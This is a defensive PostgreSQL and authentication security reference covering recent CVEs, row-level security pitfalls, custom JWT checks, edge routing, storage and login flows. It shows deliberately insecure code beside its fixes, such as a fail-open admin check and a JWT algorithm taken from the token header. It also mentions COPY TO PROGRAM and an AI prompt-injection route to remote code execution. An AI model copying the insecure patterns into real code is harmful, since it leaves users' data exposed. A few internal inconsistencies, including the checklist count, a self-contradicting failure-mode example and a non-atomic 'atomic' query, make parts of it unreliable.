# Postgres & Auth Security: Full Reference

Detailed reasoning, exact parameters, and full CVE records backing `SKILL.md`.
Researched against OWASP, NIST, PostgreSQL advisory pages, and published
incident reports. Current to mid-2026.

---

## 1. PostgreSQL version and patch status

**Safe minimums as of June 2026**

| Branch | Minimum safe version | Key CVEs fixed | EOL |
|--------|---------------------|----------------|-----|
| 14     | 14.23+              | All 2025-2026 batches | **Nov 12, 2026** - migrate now |
| 15     | 15.18+              | same | Nov 2027 |
| 16     | 16.14+              | same | Nov 2028 |
| 17     | 17.10+              | same | Nov 2029 |
| 18     | 18.4+               | same | Nov 2030 |

Versions 12 and 13 reached end-of-life in November 2024. Do not run them.
**PostgreSQL 14 reaches EOL November 12, 2026.** 14.23 is the last release
it will ever receive. If production workloads are on 14, plan the pg_upgrade
to 16 or 17 now - not after November.

### CVE-2025-1094: psql SQL injection (CVSS 8.1)
`psql` mishandles invalid UTF-8 byte sequences in `PQescapeLiteral()` and
related libpq escape functions. An attacker who can inject input can escape
the quoting and reach raw SQL, then use psql's `\!` meta-command for OS
shell execution. Exploited in the December 2024 BeyondTrust breach chain
(US Treasury). Fixed in 17.3, 16.7, 15.11, 14.16, 13.19.

### CVE-2026-2004 / CVE-2026-2005 (CVSS 8.8)
`intarray` and `pgcrypto` extensions allow arbitrary code execution as the
OS user running the database, via crafted input to the selectivity estimator
and a heap buffer overflow respectively. Fixed in 18.2, 17.8, 16.12.

### May 2026 security release: 11 CVEs (18.4 / 17.10 / 16.14 / 15.18 / 14.23)

The largest single-patch security release in PostgreSQL history, published
May 14, 2026. Three CVEs are rated CVSS 8.8 with practical exploit
paths; patch this week.

**CVE-2026-6473 (CVSS 8.8): Integer wraparound, all versions 14-18**
Multiple server features allow integer overflow in memory-allocation size
calculations. The backend allocates a buffer too small for what it then
writes, producing an out-of-bounds write and server crash or compromise.
Also affects `contrib/intarray` and `contrib/ltree` query parsing. Reported
by at least ten researchers from three independent groups.

**CVE-2026-6475 (CVSS 8.8): pg_basebackup / pg_rewind symlink traversal**
The backup tools follow symlinks without checking for path traversal. A
hostile server can direct the backup client to overwrite arbitrary files on
the client's OS, achieving OS-account hijack on the machine running the
backup. Relevant for CI/CD pipelines with automated backup/restore.

**CVE-2026-6477 (CVSS 8.8): libpq PQfn() stack buffer overflow**
`PQfn()` for non-integer result types is not passed the output buffer size,
so a server can return arbitrarily large data and overwrite client stack
memory. Because `psql \lo_export` and `pg_dump` both call `lo_read()` which
uses `PQfn()` internally, a malicious server superuser can compromise the
dump client. This function is now deprecated; avoid using it.

**CVE-2026-6472 (CVSS 5.4): CREATE TYPE missing schema privilege check**
`CREATE TYPE … AS MULTIRANGE` does not verify the creator has `CREATE`
privilege on the specified schema, allowing an attacker to plant a type
in a schema ahead of a trusted type in another user's `search_path`. Same
attack class as CVE-2018-1058. The victim then executes the attacker's
arbitrary SQL functions. Fix: revoke unnecessary `CREATE` grants.

**CVE-2026-6478 (CVSS 6.5): MD5 authentication timing side-channel**
PostgreSQL's MD5 password comparison during authentication uses non-constant-
time string comparison, allowing an attacker with repeated connection access
to recover credentials via timing differences without ever triggering a
login failure. SCRAM-SHA-256 (the default since PG14) is immune.

The catch: clusters that were pg_upgrade-d from PG13 or earlier still have
MD5 hashes baked in for roles that never changed their password post-upgrade.

Audit command:
```sql
-- Run this on every production cluster
SELECT rolname FROM pg_authid WHERE rolpassword LIKE 'md5%';
```
If this returns any rows, those accounts are vulnerable. Remediation:
1. Have each user change their password (triggers re-hash with SCRAM).
2. Or: `ALTER ROLE username WITH PASSWORD 'new-password';`
3. Ensure pg_hba.conf uses `scram-sha-256`, not `md5`, for all entries.

**CVE-2026-6479 (CVSS 7.5): SSL/GSS recursion DoS**
A malicious client alternating rejected SSL and GSS encryption requests
triggers unbounded recursion in the startup packet handler, crashing the
PostgreSQL backend. Unauthenticated - any client that can reach port 5432
can crash the instance. Prioritize patching any instance reachable from
untrusted networks.

**CVE-2026-6638 (CVSS 3.7): Logical replication SQL injection**
`ALTER SUBSCRIPTION … REFRESH PUBLICATION` interpolates schema and relation
names into SQL without quoting, allowing a subscriber table creator to
execute arbitrary SQL with the publication-side credentials at the next
refresh. Affects v16+. Relevant for multi-tenant or federated replication.

**CVE-2026-6637 - contrib/spi (refint) stack overflow + SQL injection**
The refint module is a 1990s-vintage referential-integrity implementation
that was obsoleted the moment real foreign keys shipped. Stack buffer
overflow and SQL injection allow an unprivileged DB user to execute arbitrary
code. If `refint` is loaded: drop it immediately with `DROP EXTENSION refint`.

---

## 2. Row-Level Security: full failure taxonomy

### Off by default
`ENABLE ROW LEVEL SECURITY` must be applied explicitly to every table.
Supabase's dashboard began enabling it for UI-created tables in late 2025,
but SQL migrations, ORMs, and external tooling still skip it.

Verify with:
```sql
SELECT schemaname, tablename, rowsecurity
FROM pg_tables
WHERE schemaname = 'public'
ORDER BY tablename;
```

### USING (true) / WITH CHECK (true)
A policy evaluating `true` unconditionally is identical to no policy. These
are frequently created as scaffolding and never tightened.

### Partial operation coverage
`USING` governs `SELECT` and `DELETE`. `WITH CHECK` governs `INSERT` and
`UPDATE`. A policy providing only `USING` leaves writes completely unguarded.

### Table-owner bypass: the invisible one
Superusers, roles with `BYPASSRLS`, and the table owner all skip RLS unless
the table has `FORCE ROW LEVEL SECURITY`. Many ORMs and migration tools
connect as the table owner, making all policies silently ineffective.
```sql
ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;
ALTER TABLE invoices FORCE ROW LEVEL SECURITY;
CREATE POLICY tenant_isolation ON invoices
  USING (tenant_id = current_setting('app.tenant_id')::uuid)
  WITH CHECK (tenant_id = current_setting('app.tenant_id')::uuid);
```

### CVE-2024-10976: query plan caching discards correct policy
When a plan is created under one role and re-executed under another (via
`SET ROLE`, `SECURITY DEFINER` functions, connection pool multiplexing,
subqueries, or security-invoker views), Postgres may apply the wrong policy.
Fixed in 17.1, 16.5, 15.9, 14.14, 13.17.

### Materialized views bypass RLS
Materialized views pre-aggregate data at refresh time. The RLS policies of
the underlying tables do not apply when the view is queried. Any role that
can `SELECT` from the view sees all rows in it, regardless of per-row
policies. Use materialized views only for non-sensitive aggregates, and grant
access only to the specific roles that need the aggregate data.

---

## 3. Custom RLS session-binding: worked example and failure modes

A common pattern in custom-auth stacks: the edge function extracts a JWT,
verifies it, then calls a PL/pgSQL RPC to set a session-level variable before
running queries. Example:
```sql
CREATE OR REPLACE FUNCTION public.set_current_user(p_uid uuid)
RETURNS void LANGUAGE plpgsql SECURITY DEFINER
SET search_path = pg_catalog, public
AS $$
BEGIN
  PERFORM set_config('app.current_user_id', p_uid::text, true);  -- is_local=true
END;
$$;

CREATE OR REPLACE FUNCTION public.current_user_id()
RETURNS uuid LANGUAGE sql STABLE SECURITY DEFINER
SET search_path = pg_catalog, public
AS $$
  SELECT nullif(current_setting('app.current_user_id', true), '')::uuid;
$$;
```

**Failure mode 1 - fail-open policy:**
```sql
-- RISKY: if current_user_id() returns NULL, this may throw or behave
-- unpredictably depending on how NULL is handled in the comparison.
USING (public.current_user_id() = user_id)

-- SAFE: NULL = anything is NULL (falsy), so absent context = no rows.
-- This is actually safe as written because NULL != any uuid.
-- Explicitly document it as intentionally fail-closed.
```

**Failure mode 2 - is_admin() fails open:**
```sql
-- RISKY: returns true when session var absent or on any error
CREATE FUNCTION is_admin() RETURNS bool LANGUAGE plpgsql AS $$
BEGIN
  RETURN current_setting('app.role', true) = 'admin';
EXCEPTION WHEN OTHERS THEN
  RETURN true;  -- BUG: exception path grants admin to everyone
END;
$$;

-- SAFE: exception path fails closed
EXCEPTION WHEN OTHERS THEN
  RETURN false;
```

**Failure mode 3 - SET vs SET LOCAL:**
```sql
-- SET (session-scoped): variable persists even after the transaction ends.
-- In a connection pool, this leaks the user_id to the next request
-- served on the same connection.
SELECT set_config('app.current_user_id', uid, false);  -- false = session-scoped

-- SET LOCAL (transaction-scoped): automatically cleared at COMMIT/ROLLBACK.
-- Use this in connection-pooled environments.
SELECT set_config('app.current_user_id', uid, true);   -- true = transaction-scoped
```

**Failure mode 4 - RPC error not caught:**
If the call to `set_current_user()` throws an exception in the edge function
and the error is swallowed or causes an early return that skips the query,
the next call in the code may run queries without a set context. The query
will see RLS filter as `NULL = user_id` which returns no rows - which is
correct fail-closed behavior - but only if the query actually runs. If a
different code path bypasses the query and returns cached data, that cached
data may not be RLS-filtered.

---

## 4. SECURITY DEFINER and search_path

A `SECURITY DEFINER` function runs with the owner's privileges. Without a
locked `search_path`, an attacker who can create objects in any schema on
the search path can shadow trusted objects and run code with elevated
permissions.

The same root cause resurfaced in:
- **CVE-2018-1058** - PUBLIC CREATE + search_path shadowing
- **CVE-2020-14349** - logical replication left search_path unsanitized
- **CVE-2023-2454** - schema_element syntax bypassed hardening

Every SECURITY DEFINER function:
```sql
CREATE OR REPLACE FUNCTION secure_fn()
RETURNS void LANGUAGE plpgsql SECURITY DEFINER
SET search_path = pg_catalog, public
AS $$ BEGIN ... END; $$;
```

---

## 5. Password hashing: exact parameters

### Argon2id (preferred)
- Memory: ≥ 19 MiB (OWASP 2026 baseline), 64 MiB if server allows
- Iterations: ≥ 2
- Parallelism: ≥ 1 (match CPU threads available)
- Salt: library-generated per-password, 128 bits
- Output: ≥ 32 bytes

### bcrypt (acceptable for existing code)
- Cost ≥ 12. Cost 10 can be exhausted by a consumer GPU in days.
- Target ≥ 250 ms per hash on production hardware.
- Silently truncates at 72 bytes. Pre-hash with SHA-256 + base64 if the app
  accepts passphrases longer than 72 characters.

### Never use
`md5()`, `crypt()` with DES, `SHA-1`, `SHA-256` alone, or any unsalted hash.

---

## 6. Custom JWT with crypto.subtle: security requirements

### Why custom implementations exist
Serverless edge runtimes (Cloudflare Workers, Deno Deploy, etc.) often have
restricted environments where standard JWT libraries either don't run or add
significant bundle size. Rolling a custom HMAC-SHA256 JWT using the platform's
`crypto.subtle` API is a legitimate choice - but the library's guardrails are
gone, so you have to build them yourself.

### Algorithm pinning
```javascript
// WRONG - algorithm comes from the token header, enabling confusion attack
const { alg } = JSON.parse(atob(token.split('.')[0]));
const key = await crypto.subtle.importKey('raw', secret, { name: alg }, false, ['verify']);

// CORRECT - algorithm is pinned server-side, header value ignored
const ALGORITHM = { name: 'HMAC', hash: 'SHA-256' };
const key = await crypto.subtle.importKey('raw', secret, ALGORITHM, false, ['verify']);
const valid = await crypto.subtle.verify(ALGORITHM, key, signature, data);
```

### alg:none rejection
```javascript
// Parse header BEFORE verifying signature
const header = JSON.parse(atob(parts[0]));
if (!header.alg || header.alg.toLowerCase() === 'none') {
  throw new Error('Invalid token: alg:none rejected');
}
```

### Claim verification order
1. `crypto.subtle.verify()` returns `true` - signature valid
2. Check `exp` > `Date.now() / 1000`
3. Check `nbf` ≤ `Date.now() / 1000` (if present)
4. Check `iat` is in a sane past range (reject future-dated tokens)
5. Now read `sub`, `role`, etc.

Reading claims before step 1 is a critical authentication bypass.

### Token lifetime
- Standard access tokens: ≤ 15 minutes.
- Session JWTs stored in httpOnly cookies: ≤ 24 hours is a practical
  maximum. Tokens with 7-day lifetimes (a common convenience default) create
  a long window during which a stolen token cannot be invalidated without
  rotating the signing secret (which logs out every user).
- Consider short-lived JWTs (≤ 1 hour) with a server-side session table for
  explicit revocation, rather than relying on expiry alone.

### HMAC secret requirements
- ≥ 256 bits (32 bytes) of cryptographically random entropy.
- Generated with `crypto.getRandomValues()` or equivalent, never with
  `Math.random()` or a human-readable passphrase.
- Stored in environment secrets, never in source code.
- Rotation invalidates all active tokens immediately - plan for it.

### Constant-time comparison
```javascript
// WRONG - timing side-channel: comparison short-circuits on first mismatch
if (computed === received) { ... }

// CORRECT - Web Crypto verify is constant-time by spec
const valid = await crypto.subtle.verify(ALGORITHM, key, receivedSig, data);

// If comparing byte arrays directly:
const encoder = new TextEncoder();
// Node.js:
import { timingSafeEqual } from 'node:crypto';
timingSafeEqual(encoder.encode(a), encoder.encode(b));
```

---

## 7. Serverless / edge function routing: failure modes

### Catch-all routing without a top-level auth guard
A pattern like:
```javascript
// functions/api/[[path]].js
export async function onRequest(context) {
  const path = context.params.path?.join('/') ?? '';
  if (path === 'login') return handleLogin(context);
  if (path === 'register') return handleRegister(context);
  // Auth check happens inside each handler below - RISKY
  if (path === 'profile') return handleProfile(context);
  if (path === 'documents') return handleDocuments(context);
}
```
A new handler added later may forget its auth check. Safer:
```javascript
const PUBLIC_ROUTES = new Set(['login', 'register', 'health']);
export async function onRequest(context) {
  const path = context.params.path?.join('/') ?? '';
  if (!PUBLIC_ROUTES.has(path)) {
    const user = await verifySession(context);
    if (!user) return new Response('Unauthorized', { status: 401 });
    context.user = user;
  }
  // dispatch
}
```

### Module-scope variable leakage between requests
```javascript
// WRONG - warm instances share module scope
let currentUser = null;
export async function onRequest(context) {
  currentUser = await getUser(context); // leaks to concurrent requests
}

// CORRECT - all state inside the handler
export async function onRequest(context) {
  const currentUser = await getUser(context);
}
```

### Path normalization
```javascript
// Normalize before dispatching
const safePath = new URL(request.url).pathname.replace(/^\/api\//, '');
// Reject traversal
if (safePath.includes('..') || safePath.includes('%2e%2e')) {
  return new Response('Bad Request', { status: 400 });
}
```

---

## 8. Object storage security (R2 / S3 / GCS)

### Object key design
```
// INSECURE - guessable, IDOR via log leak
users/{user_id}/{filename}

// SECURE - random prefix defeats directory traversal and enumeration
documents/{random_uuid}/{random_uuid}-{safe_filename}
```

### Pre-signed URL expiry
```javascript
// WRONG - no expiry
const url = await getSignedUrl(bucket, key);

// CORRECT - short expiry, server verifies ownership first
const doc = await db.query('SELECT object_key FROM documents WHERE id=$1 AND user_id=$2', [docId, userId]);
if (!doc) return new Response('Not found', { status: 404 });
const url = await getSignedUrl(bucket, doc.object_key, { expiresIn: 900 }); // 15 min
```

### CORS lockdown
```json
[{
  "AllowedOrigins": ["https://yourdomain.com"],
  "AllowedMethods": ["GET", "PUT"],
  "AllowedHeaders": ["Content-Type"],
  "MaxAgeSeconds": 3000
}]
```
Never `"AllowedOrigins": ["*"]` on a private bucket.

### Server-side file validation
```javascript
// Read magic bytes, not Content-Type header
const buffer = await file.arrayBuffer();
const bytes = new Uint8Array(buffer.slice(0, 8));
const isPDF = bytes[0] === 0x25 && bytes[1] === 0x50; // %P
if (!isPDF) return new Response('Invalid file type', { status: 415 });
if (buffer.byteLength > 10 * 1024 * 1024) return new Response('Too large', { status: 413 });
```

---

## 9. DB-backed rate limiting: atomic patterns

### IP source
```javascript
// WRONG - client-controlled header
const ip = request.headers.get('X-Forwarded-For');

// CORRECT - platform-verified header (Cloudflare)
const ip = request.headers.get('CF-Connecting-IP');
// nginx
const ip = request.headers.get('X-Real-IP');
```

### Atomic count-and-insert
```sql
-- Non-atomic (vulnerable to race condition):
SELECT count(*) FROM rate_limits WHERE ip=$1 AND endpoint=$2 AND created_at > now()-interval '1 min';
-- (race window here)
INSERT INTO rate_limits (ip_address, endpoint) VALUES ($1, $2);

-- Atomic alternative using advisory lock or INSERT with check:
WITH inserted AS (
  INSERT INTO rate_limits (ip_address, endpoint, created_at)
  VALUES ($1, $2, now())
  RETURNING id
),
recent AS (
  SELECT count(*) AS cnt FROM rate_limits
  WHERE ip_address=$1 AND endpoint=$2 AND created_at > now()-interval '1 min'
)
SELECT cnt FROM recent;
-- Then check cnt in application; rollback if over limit
```

### Per-account limiting
```javascript
// Add a separate counter keyed on email/username
// so distributed IPs targeting one account are still blocked
const [byIp, byEmail] = await Promise.all([
  countRecentAttempts({ ip, endpoint }),
  countRecentAttempts({ identifier: email, endpoint }),
]);
if (byIp >= 10 || byEmail >= 5) return tooManyRequests();
```

---

## 10. Password-reset token security

```sql
-- Schema: store hash, not raw token
CREATE TABLE password_reset_tokens (
  id         uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id    uuid NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  token_hash text NOT NULL,       -- SHA-256 of the raw token
  expires_at timestamptz NOT NULL DEFAULT now() + interval '1 hour',
  used       boolean NOT NULL DEFAULT false,
  created_at timestamptz NOT NULL DEFAULT now()
);
```

```javascript
// Issue:
const rawToken = crypto.randomUUID() + crypto.randomUUID(); // 256 bits entropy
const tokenHash = await sha256hex(rawToken);
await db.query(
  'INSERT INTO password_reset_tokens (user_id, token_hash) VALUES ($1, $2)',
  [userId, tokenHash]
);
// Send rawToken to user's email only

// Redeem:
const tokenHash = await sha256hex(submittedToken);
const row = await db.query(
  `SELECT id, user_id FROM password_reset_tokens
   WHERE token_hash = $1
     AND expires_at > now()   -- expiry enforced at DB level
     AND used = false`,       -- single-use enforced at DB level
  [tokenHash]
);
if (!row) return invalid();

// Invalidate BEFORE using (prevents TOCTOU on concurrent redemptions)
await db.query('UPDATE password_reset_tokens SET used=true WHERE id=$1', [row.id]);
await resetPassword(row.user_id, newPasswordHash);
```

---

## 11. Minor / guardian consent: compliance checklist

Required fields for a legally defensible consent record:

```sql
CREATE TABLE legal_consents (
  id                  uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id             uuid REFERENCES users(id),
  consent_type        text NOT NULL,         -- 'minor_guardian', 'privacy_policy', etc.
  guardian_name       text,                  -- required when consent_type includes minor
  guardian_relation   text,
  policy_version      text NOT NULL,
  policy_url          text NOT NULL,
  consented_at        timestamptz NOT NULL DEFAULT now(),
  platform_ip         text NOT NULL,         -- CF-Connecting-IP, not X-Forwarded-For
  user_agent          text,
  -- Immutability: no UPDATE permitted via application role
  CONSTRAINT no_update CHECK (true)          -- enforced via RLS WITH CHECK
);

-- Prevent application role from modifying consent records
CREATE POLICY immutable_consents ON legal_consents
  FOR UPDATE USING (false)                   -- nobody can UPDATE via app role
  WITH CHECK (false);
```

Server-side age calculation:
```javascript
function getAgeYears(dob: string): number {
  const birth = new Date(dob);
  const now = new Date();
  let age = now.getFullYear() - birth.getFullYear();
  const beforeBirthday =
    now.getMonth() < birth.getMonth() ||
    (now.getMonth() === birth.getMonth() && now.getDate() < birth.getDate());
  if (beforeBirthday) age--;
  return age;
}

// Call server-side, never trust client-submitted age
if (getAgeYears(body.date_of_birth) < 18) {
  if (!body.guardian_name || !body.guardian_relationship) {
    return new Response('Guardian details required for minors', { status: 422 });
  }
}
```

---

## 12. OWASP Top 10:2025 mapping (updated for new sections)

| OWASP Category | Sections in this skill |
|---|---|
| A01 Broken Access Control | B (RLS), C (session binding), I (object storage IDOR), K (IDOR, mass assignment) |
| A02 Security Misconfiguration | B (RLS off), D (roles), H (catch-all routing), I (public bucket) |
| A03 Supply Chain | Unpatched Postgres, pgjdbc |
| A04 Cryptographic Failures | F (passwords), G (custom JWT), J (token security) |
| A05 Injection | E (SQL), H (path traversal) |
| A07 Authentication Failures | G (custom JWT), J (session fixation), K (CVE-2025-29927) |
| A08 Integrity Failures | K (webhooks), M (consent immutability) |
| A09 Logging Failures | L (rate-limit password logging risk), M (IP spoofing in logs) |

---

## 13. Full self-audit checklist (26 items)

### PostgreSQL version
1. Postgres ≥ 14.23 / 15.18 / 16.14 / 17.10 / 18.4
2. pgjdbc ≥ 42.7.7 if using JDBC

### Row-Level Security
3. RLS enabled on every user-data table (verify via `pg_tables` query)
4. `FORCE ROW LEVEL SECURITY` where app role owns the tables
5. Policies cover SELECT, INSERT, UPDATE, DELETE (both USING and WITH CHECK)
6. No `USING (true)` or `WITH CHECK (true)` policies
7. Materialized views containing user data restricted to specific roles
8. Postgres version patched for CVE-2024-10976

### Custom RLS session binding
9. Session-binding RPC uses `SET LOCAL` (is_local=true), not session-scoped SET
10. `is_admin()` and similar functions fail-closed on missing/error context
11. RPC error is caught; auth fails closed, not silently skipped

### Roles and SECURITY DEFINER
12. App role is least-privilege, not superuser, no BYPASSRLS
13. PUBLIC schema CREATE revoked
14. Every SECURITY DEFINER function has locked search_path

### SQL and queries
15. All queries parameterized (app and PL/pgSQL EXECUTE)

### Passwords and tokens
16. Passwords hashed with Argon2id or bcrypt ≥ cost 12
17. Reset tokens: hashed in DB, ≤ 1 hr expiry, single-use, 128+ bit random
18. Token comparisons use constant-time equality

### Custom JWT
19. Algorithm pinned at verify time; `alg: none` rejected
20. All three claims (exp, nbf, iat) verified before reading payload
21. HMAC secret ≥ 256 bits random, in env vars, not source code

### Serverless routing
22. Catch-all router has top-level auth guard with explicit public-route allowlist
23. No module-scope mutable state shared between requests

### Object storage
24. Bucket is private; object keys use random UUIDs, not user IDs
25. Pre-signed URLs have expiry ≤ 15 min; server checks ownership before issuing

### Rate limiting
26. Rate-limit IP sourced from platform-verified header (CF-Connecting-IP, X-Real-IP)
27. Count-check and insert are atomic; per-account limiting exists alongside per-IP

### Application
28. Age/minor check enforced server-side; consent records immutable
29. Password-reset `used` flag and expiry checked at DB level, not only in app code
30. `sslmode=require` everywhere; `service_role` keys absent from client bundles

---

## 14. Sources

- OWASP Top 10:2025 - owasp.org/Top10/2025
- OWASP Password Storage & Authentication Cheat Sheets - cheatsheetseries.owasp.org
- NIST SP 800-63B - pages.nist.gov/800-63-3/sp800-63b.html
- PostgreSQL Security Advisories - postgresql.org/support/security
  - CVE-2018-1058, CVE-2019-10130, CVE-2020-14349, CVE-2023-2454
  - CVE-2023-39417, CVE-2024-10976, CVE-2025-1094
  - CVE-2025-8714, CVE-2025-8715, CVE-2026-2004, CVE-2026-2005
- pgjdbc channel-binding bypass (2025-06-11) - github.com/pgjdbc/pgjdbc
- CVE-2025-29927 (Next.js middleware bypass) - projectdiscovery.io
- CVE-2025-48757 (Supabase/Lovable RLS exposure) - disclosed May 2025
- Supabase Security Retro 2025 - supabase.com/blog
- Web Crypto API specification - w3.org/TR/WebCryptoAPI
- Cloudflare Workers / Pages Functions runtime docs - developers.cloudflare.com

---

## 15. Login and signup edge cases: full reference

### 15a. The account enumeration problem

Account enumeration is the ability for an unauthenticated attacker to
determine whether a given email address has an account on your service. This
sounds minor but enables:

- Targeted phishing using confirmed account holders
- Credential stuffing with pre-validated email lists (saves attackers from
  trying addresses that do not exist)
- Privacy disclosure (knowing someone uses a medical, legal, or financial
  service may itself be sensitive)
- Account takeover attempts focused only on confirmed accounts

The attack requires only a signup form, login form, or password reset form
and the ability to read which error message comes back.

### 15b. Dummy hash timing fix - why and how

When an email is not found during login, there is no password hash to run
bcrypt/Argon2id against. Without the dummy hash trick, the response returns
in milliseconds instead of 250ms+. An attacker sending 100 login attempts
and measuring response times can identify the 3 that took 250ms (real
accounts) versus the 97 that returned instantly (no account).

```javascript
// server startup - runs once
const DUMMY_HASH = await argon2.hash('dummy-placeholder-never-valid', {
  type: argon2.argon2id,
  memoryCost: 19456,
  timeCost: 2,
  parallelism: 1,
});

// login handler
async function handleLogin(email, password) {
  const user = await db.query(
    'SELECT id, password_hash, status FROM users WHERE email = $1',
    [email]
  );

  if (!user.rows[0]) {
    // Spend the same time as a real comparison to defeat timing analysis
    await argon2.verify(DUMMY_HASH, password);
    return { error: 'Incorrect email or password' };
  }

  const valid = await argon2.verify(user.rows[0].password_hash, password);
  if (!valid) return { error: 'Incorrect email or password' };

  if (user.rows[0].status !== 'active') {
    return handleInactiveAccount(user.rows[0]);
  }

  return issueSession(user.rows[0]);
}
```

### 15c. Signup with existing email: the notification email pattern

When someone submits a signup form with an email that already has an account,
the response to the form must look identical to a successful signup. The real
account owner gets an email like this:

```
Subject: Someone tried to create an account with your email

Hi [Name],

Someone submitted a signup request at [YourApp] using your email address.
Your existing account was not affected.

If this was you and you forgot your password:
[Reset your password] <- link to password reset

If this was not you, no action is needed. Your account is secure.
```

This achieves three things: the attacker learns nothing, the real user gets
a security alert, and the real user has a path to recover if they genuinely
forgot they had an account.

### 15d. Account state decision tree

```
User submits login form
|
+-- Email not found in DB
|   +-- Run dummy hash comparison (timing defense)
|   +-- Return: "Incorrect email or password"
|
+-- Email found, password wrong
|   +-- Increment failed_attempts counter
|   +-- If failed_attempts >= threshold: lock account, send lockout email
|   +-- Return: "Incorrect email or password"
|
+-- Email found, password correct
    |
    +-- status = 'unverified'
    |   +-- Optionally resend verification email
    |   +-- Return: "Please verify your email address first"
    |
    +-- status = 'locked'
    |   +-- Return: "Account locked. Check your email or reset your password."
    |
    +-- status = 'disabled'
    |   +-- Return: "Account suspended. Contact support."
    |
    +-- status = 'pending_approval'
    |   +-- Return: "Account pending review."
    |
    +-- status = 'active', MFA enabled
    |   +-- Issue a short-lived pre-MFA session token (no data access)
    |   +-- Redirect to MFA step
    |   +-- Verify MFA code with rate limiting and lockout
    |   +-- On success: upgrade session to full access
    |
    +-- status = 'active', no MFA
        +-- Reset failed_attempts counter to 0
        +-- Regenerate session ID (session fixation prevention)
        +-- Return session token in httpOnly + Secure + SameSite=Strict cookie
```

### 15e. Multiple password reset requests - token management

```sql
-- Schema
CREATE TABLE password_reset_tokens (
  id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id     uuid NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  token_hash  text NOT NULL,
  expires_at  timestamptz NOT NULL DEFAULT now() + interval '1 hour',
  used        boolean NOT NULL DEFAULT false,
  created_at  timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX idx_prt_user_unused
  ON password_reset_tokens (user_id)
  WHERE used = false;

-- When issuing a new token: invalidate all previous ones atomically
BEGIN;
  UPDATE password_reset_tokens
  SET used = true
  WHERE user_id = $1 AND used = false;

  INSERT INTO password_reset_tokens (user_id, token_hash)
  VALUES ($1, $2);
COMMIT;

-- When redeeming: check, mark used, then change password - all in one transaction
BEGIN;
  SELECT id, user_id
  FROM password_reset_tokens
  WHERE token_hash = $1
    AND expires_at > now()
    AND used = false
  FOR UPDATE;  -- lock the row to prevent concurrent redemption

  -- If no row: token invalid, expired, or already used
  UPDATE password_reset_tokens SET used = true WHERE id = $2;
  UPDATE users SET password_hash = $3 WHERE id = $4;
  UPDATE users SET failed_attempts = 0, status = 'active' WHERE id = $4;
COMMIT;
```

### 15f. Session policy implementation patterns

**Unlimited sessions (simplest):**
No extra DB table needed. JWT expiry handles cleanup. On logout, add the
jti (JWT ID) to a short-lived blocklist (Redis or a DB table pruned hourly).

**Single active session:**
```sql
ALTER TABLE users ADD COLUMN session_version integer NOT NULL DEFAULT 0;

-- On login:
UPDATE users SET session_version = session_version + 1
WHERE id = $1
RETURNING session_version;
-- Embed session_version in the JWT payload

-- On each authenticated request:
SELECT session_version FROM users WHERE id = $1;
-- If DB value != JWT value: session is invalidated, force re-login
```

**Log out everywhere:**
```sql
-- Single query invalidates all sessions across all devices
UPDATE users SET session_version = session_version + 1 WHERE id = $1;
```

### 15g. Checklist for login/signup flows

1. Signup with existing email returns same response as successful signup
2. Existing account owner receives a security notification email
3. Login failure message is identical for "wrong password" and "no account"
3. Dummy hash comparison runs even when email is not found
4. Account lockout tracks per email identifier, not only per IP
5. Lockout also tracks per IP to catch distributed attacks
6. All sessions invalidated on password change
7. All sessions invalidated on email change
8. "Log out all devices" button available in account settings
9. Password reset always responds "if account exists, email sent"
10. New password reset request invalidates all previous unredeemed tokens
11. Reset token marked used before password change, not after
12. Reset token expiry enforced at the database level (not only in app code)
13. Expired/used token shows a clear user-facing message with a re-request link
14. Soft-deleted accounts do not reveal their existence on re-signup
15. Partial/pre-MFA sessions have no data access until MFA is complete

---

## 16. RLS drift: the bypass that sneaks in after launch

RLS drift is the gap between "this table has a policy" and "every code path
that touches this table actually goes through that policy." It is the most
common security failure in production Supabase applications after the initial
setup is done correctly.

### How drift happens

1. Developer adds RLS to all tables at launch. Policies are correct.
2. Three weeks later, a new feature needs a mutation endpoint.
3. AI agent writes the endpoint. It uses `supabaseAdmin` (service role) for
   convenience or copies a pattern from a non-sensitive endpoint.
4. The service role bypasses all RLS. Every user can now mutate every row
   through this endpoint regardless of the ownership policy.
5. The bug ships because no linter or type checker catches it.

### Detection queries

```sql
-- Find tables with RLS enabled but no UPDATE policy
SELECT schemaname, tablename
FROM pg_tables t
WHERE t.rowsecurity = true
  AND t.schemaname = 'public'
  AND NOT EXISTS (
    SELECT 1 FROM pg_policies p
    WHERE p.tablename = t.tablename
      AND p.cmd IN ('UPDATE', 'ALL')
  );

-- Find tables with RLS enabled but no INSERT policy
SELECT schemaname, tablename
FROM pg_tables t
WHERE t.rowsecurity = true
  AND t.schemaname = 'public'
  AND NOT EXISTS (
    SELECT 1 FROM pg_policies p
    WHERE p.tablename = t.tablename
      AND p.cmd IN ('INSERT', 'ALL')
  );
```

### The two-client pattern that causes drift

Many Supabase codebases export both a user client and an admin client:

```typescript
// lib/supabase.ts
export const supabase = createClient(url, ANON_KEY);        // respects RLS
export const supabaseAdmin = createClient(url, SERVICE_ROLE_KEY); // bypasses RLS
```

Every route that uses `supabaseAdmin` for a write operation is a drift
point. The rule: `supabaseAdmin` is only for background jobs, migrations,
and admin-panel operations that legitimately need to bypass RLS. Any user-
facing route that modifies data must use the user-scoped client.

Code review checklist for every new mutation endpoint:
1. Which Supabase client is used? If `supabaseAdmin`, document why.
2. Is the session-binding RPC called before the mutation?
3. Does the mutation include an explicit ownership filter as a backstop?
4. Is there a WITH CHECK policy on the table for this operation?

---

## 17. Unsafe execution paths: full reference

### COPY TO PROGRAM - the most dangerous PostgreSQL feature

`COPY ... TO PROGRAM 'shell_command'` is a legitimate PostgreSQL feature
for exporting query results directly to a process. For application security
it is an OS command execution primitive.

Historical exploits using this pattern:
- pgAdmin 4 CVE-2026-12044: AI assistant prompt injection -> SECURITY DEFINER
  wrapper -> COPY TO PROGRAM -> RCE as the postgres OS user
- Multiple CTF and penetration testing PostgreSQL escalation chains

Prevention:
```sql
-- Revoke from application role
REVOKE pg_execute_server_program FROM app_role;

-- Verify no application role has this
SELECT rolname FROM pg_roles
WHERE pg_has_role(rolname, 'pg_execute_server_program', 'member');
```

In application code, never construct SQL that contains COPY TO PROGRAM from
any user-controlled or database-derived value.

